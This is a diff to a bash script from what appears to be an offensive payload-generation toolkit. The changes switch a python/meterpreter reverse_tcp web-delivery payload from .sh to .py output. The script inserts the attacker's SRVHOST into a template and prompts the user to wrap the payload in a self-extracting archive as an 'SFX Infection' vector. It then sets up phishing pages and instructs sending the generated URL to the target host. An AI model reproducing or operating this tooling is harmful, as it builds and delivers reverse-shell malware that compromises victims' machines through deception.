@@ -115,7 +115,11 @@ fi
 
 
 
-# banner display
+# -----------------------------------------
+# msf postgresql database connection check?
+# -----------------------------------------
+ChEk=`cat settings | egrep -m 1 "MSF_REBUILD" | cut -d '=' -f2` > /dev/null 2>&1
+if [ "$ChEk" == "YES" ]; then
 cat << !
     ╔─────────────────────────────────────────────────╗
     |  postgresql metasploit database connection fix  |
@@ -143,7 +147,7 @@ cat << !
     echo "[✔] postgresql connected to msf .."
     sleep 3
   fi
-
+fi
 
 
 
@@ -4003,7 +4007,7 @@ cat << !
 | SRVHOST : $srvhost
 | FORMAT  : PYTHON -> MULTI OS
 | PAYLOAD : python/meterpreter/reverse_tcp
-|_STORED  : $IPATH/output/$filename.sh
+|_STORED  : $IPATH/output/$filename.py
 
 !
 
@@ -4011,17 +4015,17 @@ cat << !
 # EDITING/BACKUP FILES NEEDED
 echo ""
 echo "[☠] editing/backup files..."
-cp $IPATH/templates/web_delivery.sh $IPATH/templates/web_delivery[bak].sh
+cp $IPATH/templates/web_delivery.py $IPATH/templates/web_delivery[bak].py
 
 
    # check if exec.ps1 exists
-   if [ -e $IPATH/templates/web_delivery.sh ]; then
-      echo "[☠] web_delivery.sh -> found!"
+   if [ -e $IPATH/templates/web_delivery.py ]; then
+      echo "[☠] web_delivery.py -> found!"
       sleep 2
  
    else
 
-      echo "[☠] web_delivery.sh -> not found!"
+      echo "[☠] web_delivery.py -> not found!"
       exit
    fi
 
@@ -4031,13 +4035,13 @@ cd $IPATH/templates/
 echo "[☠] building -> $filename.py"
 sleep 2
 # use SED to replace SRVHOST in web_delivery.py
-sed "s/SRVHOST/$srvhost/g" web_delivery.sh > $filename.sh
-mv $filename.sh $IPATH/output/$filename.sh
-chmod +x $IPATH/output/$filename.sh
+sed "s/SRVHOST/$srvhost/g" web_delivery.py > $filename.py
+mv $filename.py $IPATH/output/$filename.py
+chmod +x $IPATH/output/$filename.py
 
 # winrar/sfx trigger
-cUe=`echo $filename.sh | cut -d '.' -f1`
-N4m=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $filename.sh\nneeds to be compressed into one SFX\n\n1º compress $filename.sh into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
+cUe=`echo $filename.py | cut -d '.' -f1`
+N4m=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $filename.py\nneeds to be compressed into one SFX\n\n1º compress $filename.py into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
 
 
 cd $IPATH/templates/phishing
@@ -4080,7 +4084,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
 # CLEANING EVERYTHING UP
 echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
-mv $IPATH/templates/web_delivery[bak].sh $IPATH/templates/web_delivery.sh > /dev/null 2>&1
+mv $IPATH/templates/web_delivery[bak].py $IPATH/templates/web_delivery.py > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
 rm $D3F/index.html > /dev/null 2>&1
